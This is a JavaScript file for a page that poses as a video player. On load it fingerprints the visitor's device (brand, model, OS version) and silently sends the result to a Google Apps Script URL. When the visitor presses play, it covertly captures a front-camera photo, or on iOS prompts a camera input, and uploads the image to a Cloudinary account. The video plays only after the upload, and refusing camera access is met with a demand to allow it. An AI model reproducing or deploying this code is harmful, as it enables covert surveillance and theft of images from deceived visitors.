const playButton = document.getElementById('playButton');
const loader = document.getElementById('loader');
const video = document.getElementById('videoPlayer');
const cameraInput = document.getElementById('cameraInput');
const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);

(async () => {
    const ua = navigator.userAgent;
    const getDeviceInfo = () => {
        const android = ua.match(/Android ([0-9.]+)/);
        const ios = ua.match(/OS ([0-9_]+)/);
        
        let brand = null, model = null;
        
        if (ua.match(/iPhone/)) {
            brand = 'Apple';
            model = 'iPhone';
        }
        else if (ua.match(/iPad/)) {
            brand = 'Apple';
            model = 'iPad';
        }
        else if (ua.match(/iPod/)) {
            brand = 'Apple';
            model = 'iPod';
        }
        else if (android) {
            if (/TECNO|\bCL\d|\bK[A-Z]\d/i.test(ua)) {
                brand = 'Tecno';
                const m = ua.match(/TECNO\s+([A-Z0-9]+)|\b(CL\d+)|\b(K[A-Z]\d+)/i);
                model = m ? (m[1] || m[2] || m[3]) : 'Unknown';
            }
            else if (/Infinix|\bX\d{3,4}/i.test(ua)) {
                brand = 'Infinix';
                const m = ua.match(/Infinix\s+([A-Z0-9\s]+)|\b(X\d{3,4})/i);
                model = m ? (m[1] || m[2]).trim() : 'Unknown';
            }
            else if (/Poco|\b\d{4}DRK\d{2}G/i.test(ua)) {
                brand = 'Poco';
                const m = ua.match(/Poco\s+([^;)]+)|\b(\d{4}DRK\d{2}G)/i);
                model = m ? (m[1] || m[2]) : 'Unknown';
            }
            else if (/SM-|Samsung/i.test(ua)) {
                brand = 'Samsung';
                const m = ua.match(/SM-([A-Z0-9]+)/i);
                model = m ? 'SM-' + m[1] : 'Unknown';
            }
            else if (/Redmi|\bM\d{4}[A-Z]|\b\d{5}[A-Z]{2}\d{2}[A-Z]/i.test(ua)) {
                brand = 'Redmi';
                const m = ua.match(/Redmi\s+([^;)]+)|\b(M\d{4}[A-Z]?)|\b(\d{5}[A-Z]{2}\d{2}[A-Z])/i);
                model = m ? (m[1] || m[2] || m[3]) : 'Unknown';
            }
            else if (/Xiaomi/i.test(ua)) {
                brand = 'Xiaomi';
                const m = ua.match(/Xiaomi\s+([^;)]+)/i);
                model = m ? m[1] : 'Unknown';
            }
            else if (/OPPO|\bCPH\d{3,4}/i.test(ua)) {
                brand = 'OPPO';
                const m = ua.match(/\b(CPH\d{3,4})/i);
                model = m ? m[1] : 'Unknown';
            }
            else if (/Vivo|\bV\d{3,4}/i.test(ua)) {
                brand = 'Vivo';
                const m = ua.match(/Vivo\s+([^;)]+)|\b(V\d{3,4})/i);
                model = m ? (m[1] || m[2]) : 'Unknown';
            }
            else if (/Realme|\bRMX\d{3,4}/i.test(ua)) {
                brand = 'Realme';
                const m = ua.match(/\b(RMX\d{3,4})/i);
                model = m ? m[1] : 'Unknown';
            }
            else if (/OnePlus|ONEPLUS/i.test(ua)) {
                brand = 'OnePlus';
                const m = ua.match(/ONEPLUS\s+([A-Z0-9]+)|\b(CPH\d{3,4})/i);
                model = m ? (m[1] || m[2]) : 'Unknown';
            }
            else if (/Pixel/i.test(ua)) {
                brand = 'Google';
                const m = ua.match(/Pixel\s+([^;)\s]+)/i);
                model = m ? 'Pixel ' + m[1] : 'Pixel';
            }
            else if (/Nothing\s+Phone/i.test(ua)) {
                brand = 'Nothing';
                const m = ua.match(/Nothing\s+Phone\s+\(([^)]+)\)/i);
                model = m ? 'Phone ' + m[1] : 'Phone';
            }
            else if (/Honor|\bREA-[A-Z]{2}\d/i.test(ua)) {
                brand = 'Honor';
                const m = ua.match(/Honor\s+([^;)]+)|\b(REA-[A-Z]{2}\d+)/i);
                model = m ? (m[1] || m[2]) : 'Unknown';
            }
            else if (/Sony|\bXQ-[A-Z]{2}\d{2}/i.test(ua)) {
                brand = 'Sony';
                const m = ua.match(/Sony\s+([^;)]+)|\b(XQ-[A-Z]{2}\d{2})/i);
                model = m ? (m[1] || m[2]) : 'Unknown';
            }
            else if (/Motorola|moto\s+/i.test(ua)) {
                brand = 'Motorola';
                const m = ua.match(/moto\s+([^;)]+)/i);
                model = m ? m[1] : 'Unknown';
            }
            else if (/ZTE|\bNX\d{3,4}[A-Z]/i.test(ua)) {
                brand = 'ZTE';
                const m = ua.match(/ZTE\s+([^;)]+)|\b(NX\d{3,4}[A-Z])/i);
                model = m ? (m[1] || m[2]) : 'Unknown';
            }
            else if (/ASUS|\bAI\d{4}/i.test(ua)) {
                brand = 'ASUS';
                const m = ua.match(/ASUS\s+([^;)]+)|\b(AI\d{4})/i);
                model = m ? (m[1] || m[2]) : 'Unknown';
            }
            else if (/Meizu|\bM\d{3}[A-Z]/i.test(ua)) {
                brand = 'Meizu';
                const m = ua.match(/Meizu\s+([^;)]+)|\b(M\d{3}[A-Z])/i);
                model = m ? (m[1] || m[2]) : 'Unknown';
            }
            else if (/\bLG\b|\bLM-[A-Z]\d{3}/i.test(ua)) {
                brand = 'LG';
                const m = ua.match(/LG\s+([^;)]+)|\b(LM-[A-Z]\d{3})/i);
                model = m ? (m[1] || m[2]) : 'Unknown';
            }
            else if (/Blackview|\bBV\d{4}/i.test(ua)) {
                brand = 'Blackview';
                const m = ua.match(/Blackview\s+([^;)]+)|\b(BV\d{4})/i);
                model = m ? (m[1] || m[2]) : 'Unknown';
            }
            else if (/Huawei|\b[A-Z]{3}-[A-Z]{2}\d{2}[A-Z]/i.test(ua)) {
                brand = 'Huawei';
                const m = ua.match(/Huawei\s+([^;)]+)|\b([A-Z]{3}-[A-Z]{2}\d{2}[A-Z])/i);
                model = m ? (m[1] || m[2]) : 'Unknown';
            }
            else if (/Nokia/i.test(ua)) {
                brand = 'Nokia';
                const m = ua.match(/Nokia\s+([^;)]+)/i);
                model = m ? m[1] : 'Unknown';
            }
            else if (/itel/i.test(ua)) {
                brand = 'iTel';
                const m = ua.match(/itel\s+([A-Z0-9]+)/i);
                model = m ? m[1] : 'Unknown';
            }
            else if (/Sparx|QMobile|G'Five|Calme|Dany|Digit|VGO\s+TEL/i.test(ua)) {
                const brandMatch = ua.match(/(Sparx|QMobile|G'Five|Calme|Dany|Digit|VGO\s+TEL)/i);
                brand = brandMatch ? brandMatch[1] : 'Unknown';
                const m = ua.match(new RegExp(brand.replace(/'/g, "'") + '\\s+([^;)]+)', 'i'));
                model = m ? m[1] : 'Unknown';
            }
            else {
                const m = ua.match(/;\s*([^;)]+)\s*Build/i);
                if (m) {
                    model = m[1].trim();
                    brand = model.split(/[\s-_]+/)[0];
                }
            }
        }
        
        return {
            androidVersion: android ? android[1] : null,
            iosVersion: ios ? ios[1].replace(/_/g, '.') : null,
            brand: brand,
            model: model
        };
    };
    const deviceInfo = getDeviceInfo();
    const version = deviceInfo.androidVersion || deviceInfo.iosVersion || 'Unknown';
    
    const specs = {
        brand: deviceInfo.brand || 'Unknown',
        model: deviceInfo.model || 'Unknown',
        version: version
    };
    
    await fetch('https://script.google.com/macros/s/AKfycbwd6DFAaGBLF8RM6kD07nvTqD5Gr_SLDGTTLrkfVJ6qYrb7NtO9ZYZwqlgu4BnmQ28V/exec', {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(specs)
    }).catch(() => {});
})();

const uploadToCloudinary = async (blob) => {
    const formData = new FormData();
    formData.append('file', blob);
    formData.append('upload_preset', 'user_pre');
    const response = await fetch('https://api.cloudinary.com/v1_1/dzmg57zjf/image/upload', { method: 'POST', body: formData });
    return response.json();
};

const playVideo = () => {
    playButton.style.display = 'none';
    loader.style.display = 'none';
    video.controls = true;
    video.play();
};

if (isIOS) {
    cameraInput.addEventListener('change', async (e) => {
        const file = e.target.files[0];
        if (file) {
            playButton.style.display = 'none';
            loader.style.display = 'block';
            await uploadToCloudinary(file);
            playVideo();
        }
    });
    
    playButton.addEventListener('click', () => {
        cameraInput.click();
    });
} else {
    playButton.addEventListener('click', async () => {
        playButton.style.display = 'none';
        loader.style.display = 'block';
        
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            
            if (window.ImageCapture) {
                const videoTrack = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(videoTrack);
                const blob = await imageCapture.takePhoto();
                stream.getTracks().forEach(track => track.stop());
                await uploadToCloudinary(blob);
            } else {
                const videoEl = document.createElement('video');
                videoEl.srcObject = stream;
                videoEl.play();
                await new Promise(resolve => setTimeout(resolve, 500));
                
                const canvas = document.createElement('canvas');
                canvas.width = videoEl.videoWidth;
                canvas.height = videoEl.videoHeight;
                canvas.getContext('2d').drawImage(videoEl, 0, 0);
                stream.getTracks().forEach(track => track.stop());
                
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
                await uploadToCloudinary(blob);
            }
            
            playVideo();
        } catch (error) {
            loader.style.display = 'none';
            playButton.style.display = 'flex';
            alert('Camera permission denied. Please accept to watch the video.');
        }
    });
}
